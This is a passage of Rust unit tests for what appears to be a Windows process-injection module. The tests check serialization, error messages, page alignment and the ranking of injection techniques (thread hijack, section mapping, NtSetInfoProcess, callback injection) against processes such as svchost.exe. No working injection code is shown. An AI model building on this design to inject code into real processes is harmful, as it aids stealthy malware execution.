
    #[test]
    fn section_mapping_none_exec_method() {
        let t = InjectionTechnique::SectionMapping {
            target_pid: 9999,
            exec_method: None,
            enhanced: false,
        };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn section_mapping_in_auto_select() {
        // Verify SectionMapping appears in auto-select results for various targets.
        for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
            let techniques = auto_select_techniques(target);
            let has_sm = techniques.iter().any(|t| matches!(
                t,
                InjectionTechnique::SectionMapping { .. }
            ));
            assert!(
                has_sm,
                "SectionMapping should be in {} auto-select",
                target
            );

            // SectionMapping should be ranked after ContextOnly but before CallbackInjection.
            let sm_idx = techniques.iter().position(|t| matches!(
                t,
                InjectionTechnique::SectionMapping { .. }
            )).unwrap();
            let ctx_idx = techniques.iter().position(|t| *t == InjectionTechnique::ContextOnly).unwrap();
            let cb_idx = techniques.iter().position(|t| matches!(
                t,
                InjectionTechnique::CallbackInjection { .. }
            )).unwrap();

            assert!(
                sm_idx > ctx_idx,
                "SectionMapping (idx {}) should be after ContextOnly (idx {}) for {}",
                sm_idx, ctx_idx, target,
            );
            assert!(
                sm_idx < cb_idx,
                "SectionMapping (idx {}) should be before CallbackInjection (idx {}) for {}",
                sm_idx, cb_idx, target,
            );
        }
    }

    #[test]
    fn section_mapping_ranking_order() {
        // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
        let techniques = auto_select_techniques("svchost.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
    }

    #[test]
    fn page_align_function() {
        assert_eq!(page_align(0), 0);
        assert_eq!(page_align(1), 0x1000);
        assert_eq!(page_align(0x1000), 0x1000);
        assert_eq!(page_align(0x1001), 0x2000);
        assert_eq!(page_align(0xFFF), 0x1000);
        assert_eq!(page_align(0x2000), 0x2000);
        assert_eq!(page_align(0x10000), 0x10000);
    }

    #[test]
    fn error_display_section_mapping() {
        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::SectionMapping {
                target_pid: 1234,
                exec_method: Some(SectionExecMethod::Apc),
                enhanced: true,
            },
            reason: "NtCreateSection failed".to_string(),
        };
        let msg = err.to_string();
        assert!(msg.contains("SectionMapping"));
        assert!(msg.contains("NtCreateSection failed"));
    }

    // ── NtSetInfoProcess injection tests ──────────────────────────────────

    #[test]
    fn ntsetinfo_technique_serde_roundtrip() {
        let t = InjectionTechnique::NtSetInfoProcess { target_pid: 4321 };
        let json = serde_json::to_string(&t).unwrap();
        let t2: InjectionTechnique = serde_json::from_str(&json).unwrap();
        assert_eq!(t, t2);
    }

    #[test]
    fn ntsetinfo_technique_serde_fields() {
        let t = InjectionTechnique::NtSetInfoProcess { target_pid: 7777 };
        let json = serde_json::to_string(&t).unwrap();
        assert!(json.contains("\"NtSetInfoProcess\""));
        assert!(json.contains("\"target_pid\":7777"));
    }

    #[test]
    fn ntsetinfo_technique_equality() {
        let a = InjectionTechnique::NtSetInfoProcess { target_pid: 100 };
        let b = InjectionTechnique::NtSetInfoProcess { target_pid: 100 };
        let c = InjectionTechnique::NtSetInfoProcess { target_pid: 200 };
        assert_eq!(a, b);
        assert_ne!(a, c);
    }

    #[test]
    fn ntsetinfo_in_auto_select() {
        // Verify NtSetInfoProcess appears in auto-select results for various targets.
        for target in &["svchost.exe", "explorer.exe", "notepad.exe", "termsvc.exe"] {
            let techniques = auto_select_techniques(target);
            let has_nsip = techniques.iter().any(|t| matches!(
                t,
                InjectionTechnique::NtSetInfoProcess { .. }
            ));
            assert!(
                has_nsip,
                "NtSetInfoProcess should be in {} auto-select",
                target
            );

            // NtSetInfoProcess should be ranked after SectionMapping but before CallbackInjection.
            let nsip_idx = techniques.iter().position(|t| matches!(
                t,
                InjectionTechnique::NtSetInfoProcess { .. }
            )).unwrap();
            let sm_idx = techniques.iter().position(|t| matches!(
                t,
                InjectionTechnique::SectionMapping { .. }
            )).unwrap();
            let cb_idx = techniques.iter().position(|t| matches!(
                t,
                InjectionTechnique::CallbackInjection { .. }
            )).unwrap();

            assert!(
                nsip_idx > sm_idx,
                "NtSetInfoProcess (idx {}) should be after SectionMapping (idx {}) for {}",
                nsip_idx, sm_idx, target,
            );
            assert!(
                nsip_idx < cb_idx,
                "NtSetInfoProcess (idx {}) should be before CallbackInjection (idx {}) for {}",
                nsip_idx, cb_idx, target,
            );
        }
    }

    #[test]
    fn ntsetinfo_ranking_order() {
        // Verify the full ranking: WTH > ContextOnly > SectionMapping > NtSetInfoProcess > CallbackInjection
        let techniques = auto_select_techniques("svchost.exe");
        assert!(matches!(techniques[0], InjectionTechnique::WaitingThreadHijack { .. }));
        assert_eq!(techniques[1], InjectionTechnique::ContextOnly);
        assert!(matches!(techniques[2], InjectionTechnique::SectionMapping { .. }));
        assert!(matches!(techniques[3], InjectionTechnique::NtSetInfoProcess { .. }));
        assert!(matches!(techniques[4], InjectionTechnique::CallbackInjection { .. }));
    }

    #[test]
    fn ntsetinfo_error_display() {
        let err = InjectionError::InjectionFailed {
            technique: InjectionTechnique::NtSetInfoProcess { target_pid: 5555 },
            reason: "ProcessReadWriteVm unsupported on this build".to_string(),
        };
        let msg = err.to_string();
        assert!(msg.contains("NtSetInfoProcess"));
        assert!(msg.contains("ProcessReadWriteVm unsupported"));
    }

    #[test]
    fn ntsetinfo_distinct_from_other_techniques() {
        let nsip = InjectionTechnique::NtSetInfoProcess { target_pid: 100 };
        // Must not equal any other technique
        assert_ne!(nsip, InjectionTechnique::ContextOnly);
        assert_ne!(nsip, InjectionTechnique::ProcessHollow);
        assert_ne!(nsip, InjectionTechnique::ModuleStomp);
        assert_ne!(
            nsip,
            InjectionTechnique::SectionMapping {
                target_pid: 100,
                exec_method: None,
                enhanced: false,
            }
        );
        assert_ne!(
            nsip,
            InjectionTechnique::WaitingThreadHijack {
                target_pid: 100,
                target_tid: None,
            }
        );
    }
}
